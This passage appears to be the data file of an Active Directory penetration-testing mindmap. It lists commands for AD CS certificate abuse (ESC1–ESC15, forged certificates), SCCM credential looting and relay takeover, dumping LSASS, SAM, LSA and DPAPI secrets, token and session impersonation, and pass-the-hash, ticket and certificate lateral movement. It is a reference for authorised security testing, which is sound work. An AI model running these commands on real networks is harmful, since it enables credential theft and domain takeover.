          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "coerce and relay authentication into the CA" }]
        },
        {
          id: "adcs-templates",
          title: "Misconfigured certificate template (ESC1/2/3/13/15)",
          theory: null,
          cve: null,
          desc: "Templates that allow requester-supplied subject names or agent enrolment let you request a certificate as a privileged user.",
          cmds: [],
          branches: [
            { label: "ESC1 — enrollee supplies subject (SAN)", cmds: [
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name> -upn <target_user>@<domain>",
              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable_template>\" /altname:\"Admin\""
            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] },
            { label: "ESC2 — Any Purpose EKU", note: "The template can be used for any purpose — abuse it like ESC3.", outcomes: [{ label: "see ESC3", color: "#c084fc" }] },
            { label: "ESC3 — Enrollment Agent", cmds: [
              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable_template>\"",
              "certify.exe request /ca:<server>\\<ca-name> /template:<template> /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> /enrollcertpw:<cert-password>",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>"
            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] },
            { label: "ESC13 — issuance policy linked to a group", cmds: [
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name>",
              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable_template>\""
            ], outcomes: [{ label: "Pass the certificate (PKINIT)", color: "#9ca3af" }] },
            { label: "ESC15 — EKUwu / application policies (v1 templates)", cmds: [
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<v1_template_with_enrollee_flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication'",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<v1_template_with_enrollee_flag>' -ca <ca_name> --application-policies 'Certificate Request Agent'",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>"
            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "adcs-acl",
          title: "Misconfigured ACL (ESC4/ESC7)",
          theory: null,
          cve: null,
          desc: "Write access over a template or CA lets you make it vulnerable, exploit it, and restore it.",
          cmds: [],
          branches: [
            { label: "ESC4 — write over a template → make it ESC1", cmds: [
              "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug",
              "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json"
            ], note: "Save the original config, weaken the template, exploit as ESC1, then restore.", outcomes: [{ label: "see ESC1", color: "#c084fc" }] },
            { label: "ESC7 — Manage CA / Manage Certificates", cmds: [
              "certipy ca -ca <ca_name> -add-officer '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>",
              "certipy ca -ca <ca_name> -enable-template '<esc1_vuln_template>' -username <user>@<domain> -password <password>",
              "certipy req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable_template>' -upn '<target_user>'",
              "certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>",
              "certipy req -u <user>@<domain> -p '<password>' -ca <ca_name> -retrieve <request_id>"
            ], note: "Add yourself as an officer, enable a vulnerable template, request, then issue and retrieve the failed request.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "adcs-pki-object",
          title: "Vulnerable PKI object access control (ESC5)",
          theory: null,
          cve: null,
          desc: "Control over a PKI object (or the CA's private key) lets you forge certificates for anyone.",
          cmds: [],
          branches: [
            { label: "ESC5 — vulnerable ACL on a PKI object", outcomes: [{ label: "ACL", color: "#3b9ee5" }] },
            { label: "Golden certificate — steal the CA key and forge", cmds: [
              "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
              "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>"
            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "adcs-ca",
          title: "Misconfigured Certificate Authority (ESC6/ESC11)",
          theory: null,
          cve: null,
          desc: "A CA that honours requester-supplied SANs (ESC6) or accepts unauthenticated ICPR (ESC11) can be relayed to for a privileged certificate.",
          cmds: [],
          branches: [
            { label: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA", note: "Choose any template that permits client authentication and supply the SAN, like ESC1.", outcomes: [{ label: "see ESC1", color: "#c084fc" }] },
            { label: "ESC11 — relay to the RPC (ICPR) endpoint", cmds: [
              "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
              "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
              "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
              "certipy relay -target rpc://<ip_ca> -ca '<ca_name>'",
              "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
            ], outcomes: [{ label: "Pass the ticket", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Domain Admin", color: "#ef4444" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "adcs-mapping",
          title: "Abuse certificate mapping (ESC9/ESC10/ESC14)",
          theory: null,
          cve: null,
          desc: "Weak certificate-to-account mapping (implicit or explicit) lets a certificate for one account authenticate as another.",
          cmds: [],
          branches: [
            { label: "ESC9 / ESC10 (implicit) — set shadow credentials, then hijack the UPN", cmds: [
              "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator"
            ] },
            { label: "ESC9 — request on the vulnerable template", cmds: [
              "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable_template>"
            ] },
            { label: "ESC10 (case 1) — any template with client auth", cmds: [
              "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any_template_with_client_auth>"
            ] },
            { label: "ESC10 (case 2) — map to a DC UPN", cmds: [
              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'"
            ] },
            { label: "Reset accountB's UPN afterwards", cmds: [
              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>"
            ], note: "Kerberos mapping = ESC9/ESC10 case 1; Schannel mapping = ESC9/ESC10 case 2.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "sccm",
      title: "SCCM / MECM",
      color: "#a9d5b0",
      tag: "Config Manager abuse",
      desc: "System Center Configuration Manager (MECM) touches every managed host. Recon the hierarchy, loot Network Access Account credentials, relay site systems, and take over the site database for domain-wide execution.",
      techniques: [
        {
          id: "sccm-recon",
          title: "Recon",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Find SCCM site systems, management points, and distribution points.",
          cmds: [
            "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
            "sccmhunter.py show -all",
            "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
            "nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "sccm-cred1",
          title: "CRED-1 — No credentials (PXE)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Pull PXE boot media with no domain account (see the No Credentials → PXE technique) to recover deployment credentials.",
          cmds: [],
          outcomes: [{ label: "NAA credentials", color: "#4ade80" }, { label: "User + Pass", color: "#4ade80" }],
          moveTo: [{ section: "no-creds", label: "PXE", note: "extract PXE boot media with no credentials" }]
        },
        {
          id: "sccm-elevate1",
          title: "ELEVATE-1 — Relay to site systems (simple user)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Coerce the SCCM site server and relay it to the other site systems.",
          cmds: [
            "ntlmrelayx.py -tf <site_systems> -smb2support -socks   # listen for the connection"
          ],
          outcomes: [{ label: "Admin on site system", color: "#4ade80" }],
          moveTo: [{ section: "no-creds", label: "Coerce", note: "coerce the SCCM site server first" }]
        },
        {
          id: "sccm-elevate2",
          title: "ELEVATE-2 — Force client push (simple user)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Trigger client push installation so the push account authenticates to your relay.",
          cmds: [
            "ntlmrelayx.py -t <sccm_server> -smb2support -socks",
            "SharpSCCM.exe invoke client-push -mp <sccm_server> -sc <site_code> -t <attacker_ip>   # launch client push install",
            "proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "sccm-elevate3",
          title: "ELEVATE-3 — Automatic client push (simple user)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Register a fake computer, wait for automatic client push, and relay the push account's NTLM.",
          cmds: [
            "dnstool.py -u '<domain>\\<user>' -p <pass> -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>",
            "setspn -D host/<newcomputer>.<domain> <newcomputer>   # remove the host SPN from the machine account",
            "ntlmrelayx.py -tf <no_signing_target> -smb2support -socks   # wait ~5 min for client push"
          ],
          outcomes: [{ label: "Relay NTLM", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the captured client-push NTLM" }]
        },
        {
          id: "sccm-cred6",
          title: "CRED-6 — Loot creds from a distribution point",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Recover credentials from packages and policies hosted on a distribution point over SMB or HTTP.",
          cmds: [],
          branches: [
            { label: "SMB service (445/TCP) on a DP", cmds: [
              "cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt"
            ] },
            { label: "HTTP service (80/443) on a DP", cmds: [
              "SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'",
              "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'",
              "sccm-http-looter -server <ip_dp>"
            ] }
          ],
          outcomes: [{ label: "User + Pass", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "sccm-takeover1",
          title: "TAKEOVER-1 — Relay to the MSSQL database (simple user)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "When the site database is on a separate MSSQL host, coerce the SCCM server and relay it to MSSQL to add a site admin.",
          cmds: [
            "sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked",
            "ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q <query>",
            "sccmhunter.py admin -u <target_user>@<domain> -p <password> -ip <sccm_ip>"
          ],
          outcomes: [{ label: "SCCM ADMIN", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "sccm-takeover2",
          title: "TAKEOVER-2 — Relay to the MSSQL server (simple user)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Relay the coerced SCCM server to MSSQL and execute as the SCCM server machine account.",
          cmds: [
            "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
            "proxychains smbexec.py -no-pass <domain>/<sccm_server>$@<sccm_ip>"
          ],
          outcomes: [{ label: "Admin MSSQL", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "sccm-cred2",
          title: "CRED-2 — Policy request credentials (simple user)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Register a device, request its machine policy, and decrypt the returned Network Access Account secret.",
          cmds: [
            "sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\\<computer_added>$' '<computer_pass>'",
            "policysecretunobfuscate.py   # get NetworkAccessUsername and NetworkAccessPassword",
            "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"
          ],
          outcomes: [{ label: "User + Pass", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "sccm-cred34",
          title: "CRED-3 / CRED-4 — Local admin on an SCCM host",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "With admin on an SCCM client or site system, dump stored DPAPI/NAA secrets locally.",
          cmds: [
            "dploot.py sccm -u <admin> -p '<password>' <sccm_target>",
            "sccmhunter.py dpapi -u <admin> -p '<password>' -target <sccm_target> -debug",
            "SharpSCCM.exe local secrets -m disk",
            "SharpSCCM.exe local secrets -m wmi"
          ],
          outcomes: [{ label: "NAA credentials", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "sccm-cred5",
          title: "CRED-5 — SCCM admin (site database)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "As an SCCM admin, dump the site server hash and read encrypted credentials straight from the site database.",
          cmds: [
            "secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>",
            "mssqlclient.py -windows-auth -hashes :<sccm_target_hashNT> '<domain>/<sccm_target>$'@<sccm_mssql>",
            "use CM_<site_code>;",
            "SELECT * FROM SC_UserAccount",
            "sccmdecryptpoc.exe <cyphered_value>"
          ],
          outcomes: [{ label: "Site DB credentials", color: "#9ca3af" }],
          moveTo: []
        },
        {
          id: "sccm-exec",
          title: "EXEC-1 / EXEC-2 — Execute as SCCM admin",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Push an application or script to managed devices for lateral execution.",
          cmds: [
            "SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner",
            "sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>"
          ],
          outcomes: [{ label: "Lateral move", color: "#9ca3af" }],
          moveTo: []
        },
        {
          id: "sccm-cleanup",
          title: "Cleanup",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Remove the rogue device you registered during relay/push abuse.",
          cmds: [
            "SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier\"",
            "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "sccm-post",
          title: "Post exploit",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "As an SCCM admin, map user sessions across managed devices for targeting.",
          cmds: [
            "SCCMHound.exe --server <server> --sitecode <sitecode>"
          ],
          outcomes: [{ label: "User sessions", color: "#9ca3af" }],
          moveTo: []
        }
      ]
    },

    {
      id: "admin-access",
      title: "Admin access (credential harvesting)",
      color: "#f0c9bd",
      tag: "Loot secrets",
      desc: "You have local admin / SYSTEM on a host. Dump every credential store — LSASS, SAM, LSA, DPAPI — impersonate tokens, and collect anything reusable elsewhere.",
      techniques: [
        {
          id: "aa-lsass",
          title: "Extract credentials from LSASS",
          theory: { label: "Credential Dumping", url: "theory/2026-08-18-windows-credential-storage.html" },
          cve: null,
          desc: "Dump the LSASS process for logon passwords, NT hashes, and Kerberos tickets.",
          cmds: [],
          branches: [
            { label: "LSASS as a protected process (PPL)", cmds: [
              "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp   # before the 2022-07-22 update",
              'mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe" "!-"'
            ] },
            { label: "Extract LSASS secrets", cmds: [
              "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
              'mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"',
              "msf> load kiwi creds_all",
              "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
              "lsassy -d <domain> -u <user> -p <password> <ip>"
            ] }
          ],
          outcomes: [{ label: "User + Pass", color: "#4ade80" }, { label: "NTLM", color: "#e8912e" }, { label: "PassTheHash", color: "#9ca3af" }, { label: "Clear text move", color: "#9ca3af" }],
          moveTo: []
        },
        {
          id: "aa-sam",
          title: "Extract credentials from SAM",
          theory: { label: "Credential Dumping", url: "theory/2026-08-18-windows-credential-storage.html" },
          cve: null,
          desc: "Dump local account hashes from the SAM hive.",
          cmds: [
            "nxc smb <ip_range> -u <user> -p <password> --sam",
            "msf> hashdump",
            'mimikatz "privilege::debug" "lsadump::sam" "exit"',
            "secretsdump.py <domain>/<user>:<password>@<ip>",
            "reg save HKLM\\SAM sam.save; reg save HKLM\\SYSTEM system.save   # then: secretsdump.py -system system.save -sam sam.save LOCAL",
            "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'",
            "regsecrets.py <domain>/<user>:<password>@<ip>"
          ],
          outcomes: [{ label: "NTLM", color: "#e8912e" }, { label: "PassTheHash", color: "#9ca3af" }],
          moveTo: []
        },
        {
          id: "aa-lsa",
          title: "Extract credentials from LSA",
          theory: { label: "Credential Dumping", url: "theory/2026-08-18-windows-credential-storage.html" },
          cve: null,
          desc: "Dump LSA secrets (service accounts, cached domain logons, machine account).",
          cmds: [
            "nxc smb <ip_range> -u <user> -p <password> --lsa",
            'mimikatz "privilege::debug" "lsadump::lsa" "exit"',
            "reg save HKLM\\SECURITY security.save; reg save HKLM\\SYSTEM system.save   # then: secretsdump.py -system system.save -security security.save LOCAL",
            "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'"
          ],
          outcomes: [{ label: "MSCache 2", color: "#e8912e" }, { label: "User + Pass", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "aa-dpapi",
          title: "Extract credentials from DPAPI",
          theory: { label: "Credential Dumping", url: "theory/2026-08-18-windows-credential-storage.html" },
          cve: null,
          desc: "Recover browser passwords, cookies, and stored credentials protected by DPAPI.",
          cmds: [],
          branches: [
            { label: "DPAPI", cmds: [
              "nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]",
              "donpapi <domain>/<user>:<password>@<target>",
              "dpapidump.py <domain>/<user>:<password>@<target>"
            ] },
            { label: "Get the masterkey", cmds: [
              'mimikatz "sekurlsa::dpapi"',
              "lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys",
              "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
              "SharpDPAPI.exe triage"
            ] },
            { label: "Crack the user masterkey", cmds: [
              "copy c:\\users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>",
              "DPAPImk2john.py --preferred <prefered_file>",
              "DPAPImk2john.py -c domain -mk <masterkey> -S <sid>"
            ], outcomes: [{ label: "DPAPImk", color: "#e8912e" }] }
          ],
          outcomes: [{ label: "User + Pass", color: "#4ade80" }, { label: "PassTheHash", color: "#9ca3af" }, { label: "Clear text move", color: "#9ca3af" }],
          moveTo: []
        },
        {
          id: "aa-impersonate",
          title: "Impersonate",
          theory: { label: "Credential Dumping", url: "theory/2026-08-18-windows-credential-storage.html" },
          cve: null,
          desc: "Steal or impersonate the token / session of another logged-on user.",
          cmds: [],
          branches: [
            { label: "Token impersonation", cmds: [
              "msf> use incognito; impersonate_token <domain>\\<user>",
              "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
              "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
              "irs.exe list; irs.exe exec -p <pid> -c <command>"
            ] },
            { label: "Impersonate with AD CS (Masky)", cmds: [
              "masky -d <domain> -u <user> {-p <password> || -k || -H <hash>} -ca <certificate_authority> <ip>"
            ], outcomes: [{ label: "NTLM", color: "#e8912e" }, { label: "Pass the hash / ticket / certificate", color: "#9ca3af" }] },
            { label: "Impersonate an RDP session", cmds: [
              "psexec.exe -s -i cmd",
              "query user",
              "tscon.exe <id> /dest:<session_name>"
            ], outcomes: [{ label: "RDP", color: "#9ca3af" }] }
          ],
          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "User + Pass", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "aa-misc",
          title: "Misc",
          theory: null,
          cve: null,
          desc: "Other credential sources worth checking on a compromised host.",
          cmds: [],
          branches: [
            { label: "Find users", cmds: [
              "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv"
            ], outcomes: [{ label: "Username", color: "#3b9ee5" }] },
            { label: "Extract KeePass", cmds: [
              "KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll",
              "KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>"
            ], outcomes: [{ label: "User + Pass", color: "#4ade80" }] },
            { label: "Hybrid (Azure AD Connect)", cmds: [
              "azuread_decrypt_msol_v2.ps1   # dump the cleartext MSOL account password on the AD Connect server",
              "nxc smb <ip> -u <user> -p <password> -M msol"
            ], outcomes: [{ label: "DCSYNC", color: "#3b82f6" }] }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "lateral-move",
      title: "Lateral Move",
      color: "#8a94a8",
      tag: "Move across hosts",
      desc: "Reuse a credential, hash, ticket, or certificate to execute on other hosts. Pick the technique that matches what you hold.",
      techniques: [
        {
          id: "lm-cleartext",
          title: "Clear text password",
          theory: null,
          cve: null,
          desc: "Authenticate with a known password over the protocol available on the target.",
          cmds: [],
          branches: [
            { label: "Interactive shell — PsExec", cmds: [
              "psexec.py <domain>/<user>:<password>@<ip>",
              "psexec.exe -AcceptEULA \\\\<ip>",
              "psexecsvc.py <domain>/<user>:<password>@<ip>"
            ], outcomes: [{ label: "Authority/System", color: "#9ca3af" }] },
            { label: "Pseudo-shell (file write and read)", cmds: [
              "atexec.py <domain>/<user>:<password>@<ip> \"command\"",
              "smbexec.py <domain>/<user>:<password>@<ip>",
              "wmiexec.py <domain>/<user>:<password>@<ip>",
              "dcomexec.py <domain>/<user>:<password>@<ip>",
              "nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>"
            ] },
            { label: "WinRM", cmds: [
              "evil-winrm -i <ip> -u <user> -p <password>",
              "Enter-PSSession -ComputerName <computer> -Credential <domain>\\<user>",
              "nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>"
            ], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
            { label: "RDP", cmds: ["xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>"], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
            { label: "SMB", cmds: [
              "smbclient.py <domain>/<user>:<password>@<ip>",
              "smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>"
            ], outcomes: [{ label: "Search files", color: "#9ca3af" }] },
            { label: "MSSQL", cmds: [
              "nxc mssql <ip_range> -u <user> -p <password>",
              "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
            ], outcomes: [{ label: "MSSQL", color: "#9ca3af" }] }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "lm-nthash",
          title: "NT hash",
          theory: null,
          cve: null,
          desc: "Pass the NT hash instead of a password (PtH), or overpass-the-hash to obtain a TGT.",
          cmds: [],
          branches: [
            { label: "MSSQL / PseudoShell / PsExec / SMB / WinRM", cmds: [
              "impacket: same as with creds, but use -hashes ':<hash>'",
              "nxc: same as with creds, but use -H ':<hash>'"
            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
            { label: "Pass the Hash", cmds: [
              'mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"'
            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
            { label: "Pass the Hash — RDP (enable RestrictedAdmin first)", cmds: [
              "reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'",
              "xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>"
            ], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
            { label: "Pass the Hash — WinRM", cmds: ["evil-winrm -i <ip> -u <user> -H <hash>"], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
            { label: "Overpass the Hash / Pass the Key (PTK)", cmds: [
              "Rubeus.exe asktgt /user:victim /rc4:<rc4value>",
              "Rubeus.exe ptt /ticket:<ticket>",
              "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe",
              "getTGT.py <domain>/<user> -hashes :<hashes>"
            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "lm-kerberos",
          title: "Kerberos (ticket / key)",
          theory: null,
          cve: null,
          desc: "Reuse a Kerberos ccache/kirbi ticket (PtT) or an AES key.",
          cmds: [],
          branches: [
            { label: "Pass the Ticket (ccache / kirbi)", cmds: [
              "ticketConverter.py <kirbi||ccache> <ccache||kirbi>   # convert format",
              "export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache   # then impacket: use -k -no-pass",
              'mimikatz kerberos::ptc "<ticket>"',
              "Rubeus.exe ptt /ticket:<ticket>",
              "proxychains secretsdump.py -k '<domain>/<user>@<ip>'"
            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
            { label: "Modify SPN of a ticket", cmds: [
              'tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>"   # PR 1256'
            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
            { label: "AES key", cmds: [
              "impacket: same as Pass the Hash but use -aesKey (and use the FQDN)",
              "proxychains secretsdump.py -aesKey <key> '<domain>/<user>@<ip>'"
            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "lm-socks",
          title: "SOCKS (relay)",
          theory: null,
          cve: null,
          desc: "Run tools through the SOCKS proxy of an ntlmrelayx session (-no-pass).",
          cmds: [
            "proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids",
            "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass   # MSSQL",
            "proxychains secretsdump.py -no-pass '<domain>/<user>@<ip>'   # DCSYNC",
            "proxychains smbclient.py -no-pass <user>@<ip>   # search files",
            "proxychains atexec.py -no-pass <domain>/<user>@<ip> \"command\"   # Authority/System",
            "proxychains smbexec.py -no-pass <domain>/<user>@<ip>   # Authority/System"
          ],
          outcomes: [{ label: "MSSQL", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Authority/System", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "lm-certificate",
          title: "Certificate (pfx)",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: null,
          desc: "Authenticate with a certificate via PKINIT or Schannel, and recover the NT hash (UnPAC-the-hash).",
          cmds: [],
          branches: [
            { label: "UnPAC the hash", cmds: [
              "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
              "gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> <domain>/<dc_name> <tgt.ccache>",
              "getnthash.py -key '<AS-REP encryption key>' '<domain>/<dc_name>'"
            ] },
            { label: "Pass the certificate — PKINIT", cmds: [
              'gettgtpkinit.py -cert-pfx <pfx_file> [-pfx-pass "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"',
              'Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show',
              "certipy auth -pfx <crt_file> -dc-ip <dc_ip>"
            ] },
            { label: "Pass the certificate — Schannel", cmds: [
              "certipy auth -pfx <pfx_file> -ldap-shell   # then add_computer, set RBCD",
              "certipy cert -pfx <pfx_file> -nokey -out user.crt",
              "certipy cert -pfx <pfx_file> -nocert -out user.key",
              "passthecert.py -action ldap-shell -crt user.crt -key user.key -domain <domain> -dc-ip <dc_ip>"
            ], outcomes: [{ label: "RBCD", color: "#12b886" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "lm-mssql",
          title: "MSSQL",
          theory: { label: "MSSQL Server Abuse", url: "theory/2026-09-24-mssql-abuse.html" },
          cve: null,
          desc: "Abuse SQL admin rights for command execution, impersonation, coercion, or linked-server hops.",
          cmds: [
            "nxc mssql <ip> -u <user> -p <password> -d <domain>   # find MSSQL access",
